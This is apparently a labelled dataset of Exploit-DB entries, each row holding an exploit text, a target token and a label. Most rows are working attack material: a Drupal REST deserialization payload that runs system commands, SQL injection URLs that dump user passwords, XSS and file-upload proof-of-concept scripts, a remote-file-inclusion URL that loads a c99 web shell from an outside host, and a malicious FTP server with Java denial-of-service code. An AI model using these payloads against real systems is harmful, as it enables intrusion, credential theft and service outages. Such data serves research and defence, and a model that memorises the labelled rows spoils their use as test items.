""O:24:\""GuzzleHttp\\Psr7\\FnStream\"":2:{s:33:\""\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\"";a:1:{s:5:\""close\"";a:2:{i:0;O:23:\""GuzzleHttp\\HandlerStack\"":3:{s:32:\""\u0000GuzzleHttp\\HandlerStack\u0000handler\"";s:2:\""id\"";s:30:\""\u0000GuzzleHttp\\HandlerStack\u0000stack\"";a:1:{i:0;a:1:{i:0;s:6:\""system\"";}}s:31:\""\u0000GuzzleHttp\\HandlerStack\u0000cached\"";b:0;}i:1;s:7:\""resolve\"";}}s:9:\""_fn_close\"";a:2:{i:0;r:4;i:1;s:7:\""resolve\"";}}""     }   ],   ""_links"": {     ""type"": {       ""href"": ""http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default""     }   } } To which Drupal responds:  HTTP/1.1 200 OK Link: <...> X-Generator: Drupal 8 (https://www.drupal.org) X-Drupal-Cache: MISS Connection: close Content-Type: application/hal+json Content-Length: 9012  {...}uid=33(www-data) gid=33(www-data) groups=33(www-data) Note: Drupal caches responses: if you're in a testing environment, clear the cache. If not, try another node ID.","['REST', 'checkForSerializedStrings()']",1
33969,"eFront 3.x - 'ask_chat.php' SQL Injection source: https://www.securityfocus.com/bid/40032/info  eFront is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  eFront 3.6.2 and prior versions are vulnerable.   http://www.example.com/www/ask_chat.php?chatrooms_ID=0%20UNION%20select%20concat%28login,0x2e,password%29,1,1,1,1%20from%20users%20--%20x","[""'ask_chat.php'""]",1
47273,"Adobe Acrobat Reader DC for Windows - Static Buffer Overflow due to Malformed Font Stream We have observed the following access violation exception in the latest version of Adobe Acrobat Reader DC for Windows, when opening a malformed PDF file:  --- cut --- (188c.47fc): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=10868d40 ebx=00001acb ecx=00001aca edx=1086cd54 esi=1086d4d8 edi=1086cd20 eip=1065d2a0 esp=19d5db40 ebp=19d5db70 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202 CoolType!CTCleanup+0x22e92: 1065d2a0 89048e          mov     dword ptr [esi+ecx*4],eax ds:002b:10874000=00000000  0:023> !address esi  [...] Usage:                  Image Base Address:           10867000 End Address:            10874000 Region Size:            0000d000 (  52.000 kB) State:                  00001000          MEM_COMMIT Protect:                00000004          PAGE_READWRITE Type:                   01000000          MEM_IMAGE Allocation Base:        105c0000 Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY Image Path:             C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\CoolType.dll Module Name:            CoolType Loaded Image Name:      C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\CoolType.dll Mapped Image Name:       More info:              lmv m CoolType More info:              !lmi CoolType More info:              ln 0x1086d4d8 More info:              !dh 0x105c0000  0:023> kb  # ChildEBP RetAddr  Args to Child               WARNING: Stack unwind information not available. Following frames may be wrong. 00 19d5db70 1065d214 1086cd20 1086d4d8 00000f5c CoolType!CTCleanup+0x22e92 01 19d5dbac 1065dabd 1086d4a0 0000000e 1086d4d8 CoolType!CTCleanup+0x22e06 02 19d5dbec 10668219 18187fb8 1086cca0 10868e60 CoolType!CTCleanup+0x236af 03 19d5dc20 10608e68 18187bb8 19d5e69c 00000f5c CoolType!CTCleanup+0x2de0b 04 19d5e344 10604051 18187bb8 19d5e5d4 19d5e754 CoolType!CTInit+0x460e1 05 19d5e428 1063e7bb 18187bb8 19d5e5d4 19d5e754 CoolType!CTInit+0x412ca 06 19d5e580 1063e47f 18187bb8 19d5e754 19d5e724 CoolType!CTCleanup+0x43ad 07 19d5e5fc 106169cd 18187bb8 108700a0 19d5e754 CoolType!CTCleanup+0x4071 08 19d5e7c4 1061619f 19d5e9b4 00000000 10870350 CoolType!CTInit+0x53c46 09 19d5e894 10615091 00000000 00000001 00000001 CoolType!CTInit+0x53418 0a 19d5ec5c 10614728 0000000c 16589e94 0000e94c CoolType!CTInit+0x5230a 0b 19d5ec9c 10613751 16589de8 0000000b 19d5ed2c CoolType!CTInit+0x519a1 0c 19d5ee08 106132e4 19d5f220 19d5f59c 0000044a CoolType!CTInit+0x509ca 0d 19d5ee5c 64552182 165486c4 19d5f220 19d5f59c CoolType!CTInit+0x5055d 0e 19d5f1a4 64550fc8 207ecb1c 19d5f220 19d5f59c AGM!AGMInitialize+0x69352 0f 19d5f304 6451bcd0 19d5f36c 207ecab8 19d5f634 AGM!AGMInitialize+0x68198 10 19d5f3a0 64523f0a 19d5f584 207ecab8 19d5f634 AGM!AGMInitialize+0x32ea0 11 19d5f5cc 64522370 1730d0d0 14293a90 207ecab8 AGM!AGMInitialize+0x3b0da 12 19d5f7a8 64520dec 1730d0d0 14293a90 e0be67fc AGM!AGMInitialize+0x39540 13 19d5f7f4 6454ffbf 1730d0d0 14293a90 207b2388 AGM!AGMInitialize+0x37fbc 14 19d5f818 6454fa3e 00000004 6454fb7f 14293a90 AGM!AGMInitialize+0x6718f 15 00000000 00000000 00000000 00000000 00000000 AGM!AGMInitialize+0x66c0e --- cut ---  Notes:  - Reproduces on Adobe Acrobat Reader DC (2019.012.20035) on Windows 10, with and without PageHeap enabled.  - The crash occurs immediately after opening the PDF document, and is caused by an attempt to write data outside of a static buffer in the CoolType.dll library.  - Attached samples: poc.pdf (crashing file), original.pdf (original file).  - We have minimized the difference between the original and mutated files down to two bytes at offset 0x123bff, changed from the original values of 0xC0 0x95 to 0xFF 0x7F. These bytes reside inside of a CFF font stream.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47273.zip",['CoolType.dll '],1
44057,"Oracle Java JDK/JRE < 1.8.0.131 / Apache Xerces 2.11.0 - 'PDF/Docx' Server Side Denial of Service ## Vulnerabilities Summary The following advisory describes two (2) vulnerabilities found in Oracle Java JDK/JRE (1.8.0.131 and previous versions) packages and Apache Xerces (2.11.0)  The vulnerabilities are:  Oracle JDK/JRE Concurrency-Related Denial of Service java.net.URLConnection (with no setConnectTimeout) Concurrency-Related Denial of Service  ## Credit An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program  ## Vendor response Update 1: Oracle has released patches to address this vulnerability and assigned CVE-2017-10355  Oracle acknowledged receiving the report, and has assigned it a tracking number: S0876966. We have no further information on patch availability or a workaround.  ## Vulnerabilities Details These two vulnerabilities can be triggered to cause a Denial of Service against a server, under the following conditions:  An attacker can pass an URL parameter that points to a controlled FTP server to the target Target server uses vulnerable component(s) to fetch the resource specified by the attacker Target server does not prevent fetching of FTP URI resources In both vulnerabilities, the attack sequence is the following:  Attacker forces vulnerable target server to parse an FTP URL which points to an attacker’s controlled FTP server Target server fetches FTP resource provided by attacker Attacker’s FTP server abruptly exits, leaving the Java process on target server with two internal threads in an infinite waiting status If the Java process is single-threaded, then it cannot further process any other client requests, reaching a Denial of Service condition with only one request from the attacker In case of a multi-threading process, then it is possible to use the same technique and reach a Denial of Service condition of all available threads, by issuing one request for each available thread The attacker’s controlled FTP server has to “abruptly” exit when the Java client will perform a RETR FTP command. This behavior is not properly handled and causes a thread concurrency Denial of Service.  For example:   require 'socket'  ftp_server = TCPServer.new 21  Thread.start do loop do  Thread.start(ftp_server.accept) do |ftp_client|     puts ""FTP. New client connected""     ftp_client.puts(""220 ftp-server"")     counter = 0     loop {         req = ftp_client.gets()         break if req.nil?         puts ""< ""+req                  if req.include? ""USER""             ftp_client.puts(""331 password"")         else             ftp_client.puts(""230 Waiting data"")             counter = counter + 1             if counter == 6                 abort             end         end     }     puts ""Aborted...""   end end end  loop do      sleep(50000) end 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 require 'socket'   ftp_server = TCPServer.new 21   Thread.start do loop do  Thread.start(ftp_server.accept) do |ftp_client|     puts ""FTP. New client connected""     ftp_client.puts(""220 ftp-server"")     counter = 0     loop {         req = ftp_client.gets()         break if req.nil?         puts ""< ""+req                  if req.include? ""USER""             ftp_client.puts(""331 password"")         else             ftp_client.puts(""230 Waiting data"")             counter = counter + 1             if counter == 6                 abort             end         end     }     puts ""Aborted...""   end end end   loop do      sleep(50000) end   When triggered, the DoS will result in a CLOSE_WAIT status on the connection between the target server and the FTP server (192.168.234.134), leaving the Java process thread stuck.    Oracle JDK/JRE Concurrency-Related Denial of Service The vulnerable functions are:  java.io.InputStream java.xml.ws.Service javax.xml.validation.Schema javax.xml.JAXBContext java.net.JarURLConnection – The setConnectionTimeout and setReadTimeout are ignored javax.imageio.ImageIO Javax.swing.ImageIcon javax.swing.text.html.StyleSheet   ## java.io.InputStream Proof of Concept  ``` import java.io.InputStream; import java.net.URL;  public class RandomAccess {  public static void main(String[] args) {   try {    //url = new URL (""ftp://maliciousftp:2121/test.xml"");    URL url = new URL(""ftp://maliciousftp:2121/test.xml"");    InputStream inputStream = url.openStream();    inputStream.read();    //urlc.setReadTimeout(5000);    //urlc.setConnectTimeout(5000); // <- this fixes the bug   } catch (Exception e) {    e.printStackTrace();   }  } } ```  ## javax.xml.ws.Service Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL;  import javax.xml.namespace.QName; import javax.xml.ws.Service;  public class CreateService {  public static void main(String[] args) {   String wsdlURL = ""ftp://maliciousftp:2121/test?wsdl"";   String namespace = ""http://foo.bar.com/webservice"";   String serviceName = ""SomeService"";   QName serviceQN = new QName(namespace, serviceName);    try {    Service service = Service.create(new URL(wsdlURL), serviceQN);   } catch (MalformedURLException e) {    e.printStackTrace();   }  }  } ```  ## javax.xml.validation.Schema Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL;  import javax.xml.validation.Schema; import javax.xml.validation.SchemaFactory;  import org.xml.sax.SAXException;  public class NSchema {  public static void main(String[] args) {   SchemaFactory schemaFactory =   SchemaFactory.newInstance(""http://www.w3.org/2001/XMLSchema"");   URL url;   try {    url = new URL(""ftp://maliciousftp:2121/schema"");    try {     Schema schemaGrammar = schemaFactory.newSchema(url);    } catch (SAXException e) {     e.printStackTrace();    }   } catch (MalformedURLException e) {    e.printStackTrace();   }  } } ```  ## javax.xml.JAXBContext Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL;  import javax.xml.bind.JAXBContext; import javax.xml.bind.JAXBException; import javax.xml.bind.Unmarshaller;  public class UnMarsh {  public static void main(String[] args) {   JAXBContext jaxbContext = null;   try {    jaxbContext = JAXBContext.newInstance();   } catch (JAXBException e) {    e.printStackTrace();   }   URL url = null;   try {    url = new URL(""ftp://maliciousftp:2121/test"");   } catch (MalformedURLException e) {    e.printStackTrace();   }   Unmarshaller jaxbUnmarshaller = null;   try {    jaxbUnmarshaller = jaxbContext.createUnmarshaller();   } catch (JAXBException e) {    e.printStackTrace();   }   try {    Object test = jaxbUnmarshaller.unmarshal(url);   } catch (JAXBException e) {    e.printStackTrace();   }  } } ```  ## java.net.JarURLConnection Proof of Concept  ``` import java.io.IOException; import java.net.JarURLConnection; import java.net.MalformedURLException; import java.net.URL; import java.util.jar.Manifest;  public class JavaUrl {   public static void main(String[] args) {   URL url = null;   try {    url = new URL(""jar:ftp://maliciousftp:2121/duke.jar!/"");   } catch (MalformedURLException e) {    e.printStackTrace();   }   JarURLConnection jarConnection = null;   try {    jarConnection = (JarURLConnection) url.openConnection();    jarConnection.setConnectTimeout(5000);    jarConnection.setReadTimeout(5000);    } catch (IOException e1) {    e1.printStackTrace();   }   try {    Manifest manifest = jarConnection.getManifest();   } catch (IOException e) {    e.printStackTrace();   }  } } ```  ## javax.imageio.ImageIO Proof of Concept  ``` import java.awt.Image; import java.io.IOException; import java.net.URL; import javax.imageio.ImageIO; import javax.swing.ImageIcon; import javax.swing.JFrame; import javax.swing.JLabel;  public class ImageReader {  public static void main(String[] args) {   Image image = null;   try {    URL url = new URL(""ftp://maliciousftp:2121/test.jpg"");    image = ImageIO.read(url);   } catch (IOException e) {    e.printStackTrace();   }    JFrame frame = new JFrame();   frame.setSize(300, 300);   JLabel label = new JLabel(new ImageIcon(image));   frame.add(label);   frame.setVisible(true);  } } ```  ## javax.swing.ImageIcon Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL; import javax.swing.ImageIcon;  public class ImageXcon {  public static void main(String[] args) {   URL imgURL;   try {    imgURL = new URL(""ftp://maliciousftp:2121/test"");    String description = """";    ImageIcon icon = new ImageIcon(imgURL, description);   } catch (MalformedURLException e) {    e.printStackTrace();   }  } } ```  ## javax.swing.text.html.StyleSheet Proof of Concept  ``` import java.net.MalformedURLException; import java.net.URL;  import javax.swing.text.html.StyleSheet;  public class ImportStyla {   public static void main(String[] args) {   StyleSheet cs = new StyleSheet();   URL url;   try {    url = new URL(""ftp://maliciousftp:2121/test"");    cs.importStyleSheet(url);   } catch (MalformedURLException e) {    e.printStackTrace();   }  } } ```  ## java.net.URLConnection – Concurrency-Related Denial of Service A Thread Concurrency Denial of Service condition exists when java.net.URLConnection is used to fetch a file from an FTP server without specifying a Connection Timeout value.  The vulnerable functions are:  javax.xml.parsers.SAXParser javax.xml.parsers.SAXParserFactory org.dom4j.Document org.dom4j.io.SAXReader javax.xml.parsers.DocumentBuilder javax.xml.parsers.DocumentBuilderFactory The Root Cause Issue in Apache Xerces is the com.sun.org.apache.xerces.internal.impl.XMLEntityManager.class    In this case, XMLEntityManager.class does not explicitly set Connection Timeout for the connect object, letting Java to set a default value of -1, leading to a Denial of Service condition, as explained below.  Example of code using Apache Xerces library to fetch an XML file from an FTP server:  ``` [snip]     private void parseXmlFile() {      //get the factory      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();      try {       //Using factory get an instance of document builder       DocumentBuilder db = dbf.newDocumentBuilder();       //parse using builder to get DOM representation of the XML file       dom = db.parse(""ftp://maliciousftpserver/test.xml""); & lt; - FTP URL controlled by the attacker      } catch (ParserConfigurationException pce) {       pce.printStackTrace();      } catch (SAXException se) {       se.printStackTrace();      } catch (IOException ioe) {       ioe.printStackTrace();      }     } [snip] ```  ## SAXParser Proof of Concept  ``` SAXParserFactory factory = SAXParserFactory.newInstance(); SAXParser saxParser = factory.newSAXParser(); UserHandler userhandler = new UserHandler(); saxParser.parse(""ftp://badftpserver:2121/whatever.xml”) ```  ## DOM4J / SAXReader Proof of Concept  ``` SAXReader reader = new SAXReader(); Document document = reader.read( ""ftp://badftpserver:2121/whatever.xml"" ); ```  ## JAVAX XML Parsers Proof of Concept  ``` DocumentBuilder db = dbf.newDocumentBuilder();           dom = db.parse(""ftp://badftpserver:2121/whatever.xml""); ```","[""'PDF/Docx'""]",1
9496,"War-FTPD 1.65 - MKD/CD Requests Denial of Service WAR-FTPD 1.65 (MKD & CD) requests Remote Denial of Service exploited by opt!x hacker mail: optix@9.cn greetz to his0k4 about : http://securityreason.com/exploitalert/6971 you have to connect to target server from cmd like that: i sended it with perl and python scripts but it's not working because im beginner in remotes ############################################################ Microsoft Windows XP [version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp.  C:\Documents and Settings\Administrateur>ftp ftp> open Vers 5.237.109.181 21 ConnectÃ© Ã  5.237.109.181. 220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready 220 Please enter your user name. Utilisateur (5.237.109.181:(none)) : root 331 User name okay, Need password. Mot de passe : 230 User logged in, proceed. ftp> MKD A x 5000 or cd A x 5000 ##########################################################  you have to execute this perl script then put his content after MKD or CD __________________________________________________________________ my $crash= ""A"" x 5000; open(c,"">>denial.txt""); print c $crash; print ""[+] Done !! [+]""; close(c); _________________________________________________________________  then olly is executed because im working with this option : just in time debugger  ########################################################################### #################"""""" EAX 41414141 ECX 008EEC18 ASCII ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAA EDX 008E0278 EBX 008E0000 ESP 00B2F538 EBP 00B2F758 ESI 008EEC10 ASCII ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAA EDI 41414141 EIP 7C9211DE ntdll.7C9211DE ########################################################################### ##################""""""  and programm will be crashed :)   # milw0rm.com [2009-08-24]",['MKD/CD'],1
20505,"Secure Computing e.iD Authenticator for Palm 2.0 - PIN Brute Force source: https://www.securityfocus.com/bid/2105/info  Summary:  An attacker that obtains access to the ""sceiddb.pdb"" file, part of Secure Computing's e.iD Authenticator for Palm, can determine the user's PIN.  Problem Description:  Secure Computing's SafeWord is a system of authentication services that supports among other authentication methods one-time password. The one-time passwords are generated by the authenticating user via a hardware or software token device from the users PIN number and a Token Key stored in the device. During authentication, a user-generated one-time password, or tokencode, is sent to the authentication server and the user is authenticated if the tokencode was generated from a valid PIN and Token Key. In this sort of authentication system, the security of the shard secret (the user's PIN) is critical.  Secure Computing's e.iD Authenticator for Palm is a software token device for the SafeWord system that runs on the Palm Pilot. e.iD Authenticator for Palm uses a palm database (PDB) file called ""sceiddb.pdb"" containing an encrypted version of the user's PIN as well as the Token Key.  The encrypted version of the user's PIN is used when the user attempts to change his PIN. Before the PIN can be changed the user must enter their current PIN. The entered PIN is encrypted and compared to the encrypted PIN. If they don't match the device will display a warning and refuse to change the PIN.  PINs are from 2 to 8 digits in length. The encrypted PIN is always 16 bytes. The encrypted PIN is found starting at address 0x7A to address 0x89 in the ""sceiddb.pdb"" file.  As Palm Pilot and related devices are considered general purpose platforms and are not tamper-resistant devices there exist likely scenarios in which an attacker may obtain access to the ""sceiddb.pdb"" file.  An attacker with access to the ""sceiddb.pdb"" file can obtain the user's PIN by encrypting every possible 8 digit PINs and comparing them with the encrypted PIN in the ""sceiddb.pdb"" file. > @Stake has calculated the time required to obtain different length PIN numbers using a Pentium III 450MHz:  PIN Length Time to calculate PIN  2 0.023 seconds 3 0.23 seconds 4 2.3 seconds 5 23.3 seconds 6 3.8 minutes 7 38.8 minutes 8 6.48 hours  Once a user's PIN has been obtained an attacker can generate a valid tokencode if he can determine the most recent tokencode used by the user to authenticate to the SafeWord system.  Scenarios:  The are a number of likely scenarios that can allow an attacker to obtain access to the ""sceiddb.pdb"" file.  * If an attacker obtains access to the user's Palm device he can copy via IrDA (infrared), or ""beam"", the ""sceiddb.pdb"" file. By default this file does not have the ""Beam Lock"" protection bit set. This bit tells the PalmOS not to allow the beaming of the file. But the ""Beam Lock"" protection can be easily disabled.  * If an attacker obtains access to a computer the user uses to HotSync or backup his Palm device the attacker may find a copy of the ""sceiddb.pdb"" file. By default this file is configured not to be backed up. However, some third party utilities may ignore this and back it up, the user may have configured the file to be backed up, or the file may be pending download into the Palm device.  The are also a number of likely scenarios that can allow an attacker to obtain the most recent tokencode used by the user to authenticate to the SafeWord system:  * The attacker may monitor the network and extract the tokencode from non-encrypted authentication requests (e.g. telnet).  * The attacker may obtain access to the machine the user is entering the tokencode in and read the keyboard output.  * The attacker may view the tokencode as it is being physically entered by the user (""shoulder surfing"").   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20505.zip",['PINs'],1
46853,"WeChat for Android 7.0.4 - 'vcodec2_hls_filter' Denial of Service # Exploit Title: DoS Wechat with an emoji # Date: 16-May-2019 # Exploit Author: Hong Nhat Pham # Vendor Homepage: http://www.tencent.com/en-us/index.html # Software Link: https://play.google.com/store/apps/details?id=com.tencent.mm # Version: 7.0.4 # Tested on: Android 9.0 # CVE : CVE-2019-11419  Description: vcodec2_hls_filter in libvoipCodec_v7a.so in WeChat application for Android results in a DoS by replacing an emoji file (under the /sdcard/tencent/MicroMsg directory) with a crafted .wxgf file. Crash-log is provided in poc.zip file at https://drive.google.com/open?id=1HFQtbD10awuUicdWoq3dKVKfv0wvxOKS  Vulnerability Type: Denial of Service  Vendor of Product: Tencent  Affected Product Code Base: WeChat for Android - Up to latest version (7.0.4)  Affected Component: Function vcodec2_hls_filter in libvoipCodec_v7a.so  Attack Type: Local  Attack vector: An malware app can crafts a malicious emoji file and overwrites the emoji files under /sdcard/tencent/MicroMsg/[User_ID]/emoji/[WXGF_ID]. Once the user opens any chat messages that contain an emoji, WeChat will instantly crash.  POC: Video at https://drive.google.com/open?id=1x1Z3hm4j8f4rhv_WUp4gW-bhdtZMezdU  User must have sent or received a GIF file in WeChat Malware app must retrieve the phone’s IMEI. For POC, we can use the below command adb shell service call iphonesubinfo 1 | awk -F ""'"" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print}' ORS=- Produce the malicious emoji file with the retrieved IMEI (use encrypt_wxgf.py in poc.zip): python encrypt.py crash4.wxgf [SIZE_OF_EMOJI_ON_SDCARD] Replace /sdcard/tencent/MicroMsg/[User_ID]/emoji/[WXGF_ID] with the padded out.wxgf.encrypted WeChat will crash now if a message that contains the overwritten emoji file   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46853.zip","[""'vcodec2_hls_filter'""]",1
29283,"GenesisTrader 1.0 - 'form.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/21595/info   GenesisTrader is prone to multiple input-validation vulnerabilities because the application fails to sufficiently sanitize user-supplied input. These issues include multiple information-disclosure vulnerabilities, an arbitrary file-upload vulnerability, and multiple cross-site scripting vulnerabilities.   An attacker can exploit these issues to upload and execute malicious PHP code in the context of the webserver process, to view sensitive information, and to steal cookie-based authentication credentials. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible. Exploiting these issues may aid the attacker in further attacks.   Version 1.0 is vulnerable to these issues; other versions may also be affected.  http://www.example.com/index.php?cuve=[XSS] http://www.example.com/form.php?floap=ajoutfich&cuve=[XSS] http://www.example.com/form.php?floap=modfich&chem=[XSS] http://www.example.com/form.php?floap=modfich&do=[XSS] http://www.example.com/form.php?floap=rename&chem=[XSS] http://www.example.com/form.php?floap=rename&do=[XSS] http://www.example.com/form.php?floap=copy&chem=[XSS] http://www.example.com/form.php?floap=copy&do=[XSS] http://www.example.com/form.php?floap=chmod&chem=[XSS] http://www.example.com/form.php?floap=chmod&do=[XSS]","[""'form.php'""]",1
38585,"WordPress Plugin NextGEN Gallery - 'upload.php' Arbitrary File Upload source: https://www.securityfocus.com/bid/60533/info  The NextGEN Gallery plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files.  An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in an arbitrary code execution within the context of the vulnerable application.  NextGEN Gallery 1.9.12 is vulnerable; other versions may also be affected.   #! /usr/bin/perl  use LWP;  use HTTP::Request::Common;   my ($url, $file) = @ARGV;   my $ua = LWP::UserAgent->new();  my $req = POST $url,  Content_Type => 'form-data',  Content => [.  name => $name,  galleryselect => 1, # Gallery ID, should exist  Filedata => [ ""$file"", ""file.gif"", Content_Type =>  'image/gif' ]  ];  my $res = $ua->request( $req );  if( $res->is_success ) {  print $res->content;  } else {  print $res->status_line, ""\n"";  }","[""'upload.php'""]",1
8786,"Lighttpd < 1.4.23 (BSD/Solaris) - Source Code Disclosure Severe vulnerability due to a bug in FreeBSD, OS X and Solaris (<10) filesystems affecting Lighttpd (<1.4.23)  A bug was discovered in the way FreeBSD, OS X and Solaris (prior version 10) handle symlinks appended with a slash (/). Accessing a regular file through a symbolic link with appended slash succeeds because the slash apperently gets silently dropped. On systems that do not expose this behaviour, a call to stat(""symlink.php/"") or open(""symlink.php/"") to a symlink pointing to example.php, will not succeed and set errno to ENOTDIR. This is not the case on the systems mentioned.  The vulnerability arises when an application filters access to or decides how to handle a file based on a suffix match. An attacker could circumvent normal behaviour by appended a slash to the filename, resulting in said access rules not applying.   Lighttpd in versions prior to 1.4.23 was not aware of this bug and therefor can be tricked by an attacker. It decides how to process a request based on suffix rules provided in its config, usually matching ""^.*\.php$"". The attacker can bypass this rule and gain access to the sourcecode of the .php file possibly revealing sensitive information like passwords.  Other applications, not only webservers, are probably vulnerable due to this flaw as well.  The bug has been known since at least the year 2000 but has remained unfixed to this day: http://www.freebsd.org/cgi/query-pr.cgi?pr=kern/21768  Lighttpd 1.4.23 will include a workaround for said problem to prevent attacks. Bug report: http://redmine.lighttpd.net/issues/1989  Description  If you put a trailing slash / after the .php and that file is a link, it will just display the content of the file.  2009-05-22 13:40:37: (response.c.221) -- splitting Request-URI 2009-05-22 13:40:37: (response.c.222) Request-URI : /index.php/ 2009-05-22 13:40:37: (response.c.223) URI-scheme : http 2009-05-22 13:40:37: (response.c.224) URI-authority: localhost 2009-05-22 13:40:37: (response.c.225) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.226) URI-query : 2009-05-22 13:40:37: (response.c.254) -- sanatising URI 2009-05-22 13:40:37: (response.c.255) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.221) -- splitting Request-URI 2009-05-22 13:40:37: (response.c.222) Request-URI : /index.php/ 2009-05-22 13:40:37: (response.c.223) URI-scheme : http 2009-05-22 13:40:37: (response.c.224) URI-authority: localhost 2009-05-22 13:40:37: (response.c.225) URI-path : /index.php/ 2009-05-22 13:40:37: (response.c.226) URI-query : 2009-05-22 13:40:37: (response.c.254) -- sanatising URI 2009-05-22 13:40:37: (response.c.255) URI-path : /index.php/ 2009-05-22 13:40:37: (mod_access.c.135) -- mod_access_uri_handler called 2009-05-22 13:40:37: (response.c.391) -- before doc_root 2009-05-22 13:40:37: (response.c.392) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.393) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.394) Path : 2009-05-22 13:40:37: (response.c.442) -- after doc_root 2009-05-22 13:40:37: (response.c.443) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.444) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.445) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.462) -- logical -> physical 2009-05-22 13:40:37: (response.c.463) Doc-Root : /work/websites/freesoft.com/htdocs/ 2009-05-22 13:40:37: (response.c.464) Rel-Path : /index.php/ 2009-05-22 13:40:37: (response.c.465) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.482) -- handling physical path 2009-05-22 13:40:37: (response.c.483) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.490) -- file found 2009-05-22 13:40:37: (response.c.491) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (response.c.640) -- handling subrequest 2009-05-22 13:40:37: (response.c.641) Path : /work/websites/freesoft.com/htdocs/index.php/ 2009-05-22 13:40:37: (mod_indexfile.c.151) -- handling the request as Indexfile 2009-05-22 13:40:37: (mod_indexfile.c.152) URI : /index.php/ 2009-05-22 13:40:37: (mod_access.c.135) -- mod_access_uri_handler called 2009-05-22 13:40:37: (mod_staticfile.c.394) -- handling file as static file 2009-05-22 13:40:37: (response.c.652) -- subrequest finished 2009-05-22 13:40:37: (response.c.121) Response-Header:  # milw0rm.com [2009-05-26]",['symlink.php/'],1
24989,"WordPress Core 1.2.1/1.2.2 - '/wp-admin/templates.php?file' Cross-Site Scripting source: https://www.securityfocus.com/bid/11984/info   Wordpress is reported vulnerable to multiple cross-site scripting, HTML injection, and SQL injection vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied data.   The cross-site scripting and HTML injection issues could permit a remote attacker to create a malicious URI link, or post data to the affected application that includes hostile HTML and script code. If this link were to be followed, or resulting pages were to be viewed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.   An attacker may exploit the SQL injection issues to manipulate SQL queries to the underlying database. This may facilitate theft of sensitive information, potentially including authentication credentials, and data corruption.  http://www.example.com/wp-admin/templates.php?file=[XSS]","[""'/wp-admin/templates.php?file'""]",1
28025,RahnemaCo - 'page.php' Remote File Inclusion source: https://www.securityfocus.com/bid/18435/info  RahnemaCo is prone to a remote file-include vulnerability.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/shop/page.php?osCsid=http://yoursite/c99shell.txt?,"[""'page.php'""]",1
41286,"SOA School Management - 'view' SQL Injection # # # # #  # Exploit Title: Complete School Management Software with Web Portal - SQL Injection # Google Dork: N/A # Date: 09.02.2017 # Vendor Homepage: http://www.ynetinteractive.com/ # Software Buy: http://www.ynetinteractive.com/soa/ # Demo: http://www.ynetinteractive.com/soa/demo.php # Version: N/A # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # Login as student user # Other user groups have vulnerabilities. # http://localhost/[PATH]/Document.php?view=[SQL] # Etc... # # # # #","[""'view'""]",1
